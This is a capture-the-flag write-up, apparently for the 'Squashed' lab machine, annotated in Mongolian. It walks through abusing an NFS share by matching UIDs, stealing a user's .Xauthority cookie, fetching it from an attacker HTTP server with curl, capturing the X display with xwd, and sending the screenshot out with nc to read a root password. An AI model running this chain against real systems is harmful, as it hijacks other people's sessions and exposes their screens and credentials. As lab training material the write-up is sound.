# Squashed - NFS 2049 Port / .Xauthority

## NFS mount

**/var/www/html** рүү 2017 id-тай хэрэглэгч хандах боломжтой байна.

```bash
useradd -u 2017 randomuser
```

**2017 www-data**

[image]

## .Xauthority

.Xauthority файл нь хэрэглэгчийн сессийн үед X сервер руу холбогдох үед хандалтын зөвшөөрөл олгоход ашиглагддаг.

```bash
xxd .Xauthority
```

[image]

**MIT-MAGIC-COOKIE - ТАЙЛБАР:**

https://stackoverflow.com/questions/37157097/how-does-x11-authorization-work-mit-magic-cookie/37367518#37367518

[image]

[image]

## Enumerate Display

Одоогоор ямар дэлгэц холбогдсон байгааг мэдэх

```bash
ross@kali:/dev/shm/ross$ w
```

[image]

## Verify Cookie

Күүки ажиллаж байгаа эсэхийг мэдэхийн тулд **xdpyinfo** болон **xwininfo**-г ашиглана.

Хэрэв би эдгээрийг ямар ч зөвшөөрөлгүйгээр өөрийн бүрхүүлээс алекс гэж ажиллуулахыг оролдвол хоёулаа бүтэлгүйтэж байна.

```bash
alex@squashed:/home/ross$ xdpyinfo -display :0
No protocol specified
xdpyinfo:  unable to open display ":0"

alex@squashed:/home/ross$ xwininfo -root -tree -display :0
No protocol specified
xwininfo: error: unable to open display ":0"
```

## Copying .Xauthority file using NFS to attacker

Alex нь .Xauthority файлаар дамжуулж Ross хэрэглэгчийн desktop мэдээллийг харна гэсэн үг. Үүний тулд татаж файлыг NFS ашиглан татаж аваад Alex -руу буцааж хуулж авна.

```bash
(root㉿kali)-[/dev/shm] # cp .Xauthority /dev/shm
                         python3 -m http.server 80

alex@squashed:/home/ross$ curl http://10.10.16.3/.Xauthority -o /tmp/.Xauthority
```

## Tool-ийг ашиглахын тулд зарлаж өгөх хэрэгтэй

```bash
export HOME=/home/alex
cp /tmp/.Xauthority /home/alex/
```

## Use .Xauthority file for auth

```bash
XAUTHORITY=/tmp/.Xauthority xdpyinfo -display :0
XAUTHORITY=/tmp/.Xauthority xwininfo -root -tree -display :0
```

## Lets Exploit!

### Take Screenshot

**xwd** командаар desktop зургийг screenshot хийх

```bash
alex@squashed:/home/alex$ XAUTHORITY=/tmp/.Xauthority xwd -root -screen -silent -display :0 > /tmp/0xdf.xwd
```

### Get root password

```bash
# Attacker
nc 10.10.16.3 1414 < 0xdf.xwd

# Victim
nc -l -n -p 1414 > 0xdf.xwd
```

```bash
open 0xdf.xwd
```

[image]
